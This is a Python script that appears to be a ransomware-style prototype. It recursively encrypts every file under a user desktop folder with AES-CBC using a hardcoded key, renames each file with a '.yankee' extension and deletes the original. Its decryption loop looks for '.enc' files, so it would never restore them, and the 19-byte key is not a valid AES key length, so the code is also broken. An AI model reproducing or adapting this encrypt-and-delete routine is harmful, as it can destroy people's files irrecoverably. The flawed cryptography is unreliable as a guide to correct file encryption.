import glob
import os, random, struct
from Cryptodome.Cipher import AES


def encrypt_file(key, in_filename, out_filename=None, chunksize=64 * 1024):
    if not out_filename:
        out_filename = in_filename + '.yankee'

    iv = os.urandom(16)
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - len(chunk) % 16)

                outfile.write(encryptor.encrypt(chunk))


def decrypt_file(key, in_filename, out_filename=None, chunksize=24 * 1024):
    """ Decrypts a file using AES (CBC mode) with the
        given key. Parameters are similar to encrypt_file,
        with one difference: out_filename, if not supplied
        will be in_filename without its last extension
        (i.e. if in_filename is 'aaa.zip.enc' then
        out_filename will be 'aaa.zip')
    """
    if not out_filename:
        out_filename = os.path.splitext(in_filename)[0]

    with open(in_filename, 'rb') as infile:
        origsize = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]
        iv = infile.read(16)
        decryptor = AES.new(key, AES.MODE_CBC, iv)

        with open(out_filename, 'wb') as outfile:
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                outfile.write(decryptor.decrypt(chunk))

            outfile.truncate(origsize)


key = b'This is a yankee123'
startPath = 'C:/Users/Steven/Desktop/test/**'

# Encrypts all files recursively starting from startPath
for filename in glob.iglob(startPath, recursive=True):
    if (os.path.isfile(filename)):
        print('Encrypting> ' + filename)
        encrypt_file(key, filename)
        os.remove(filename)

# Decrypts the files
for filename in glob.iglob(startPath, recursive=True):
    if (os.path.isfile(filename)):
        fname, ext = os.path.splitext(filename)
        if (ext == '.enc'):
            print('Decrypting> ' + filename)
            decrypt_file(key, filename)
            os.remove(filename)